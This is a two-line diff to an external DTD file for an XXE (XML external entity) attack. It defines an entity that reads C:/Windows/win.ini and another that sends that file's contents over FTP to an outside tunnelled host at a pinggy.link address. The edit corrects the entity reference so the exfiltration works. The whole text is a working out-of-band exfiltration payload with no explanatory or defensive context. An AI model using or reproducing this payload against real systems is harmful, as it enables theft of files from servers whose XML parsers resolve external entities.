@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://%file;@gxhum-49-206-99-72.a.free.pinggy.link:33717/'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://%data;@gxhum-49-206-99-72.a.free.pinggy.link:33717/'>">
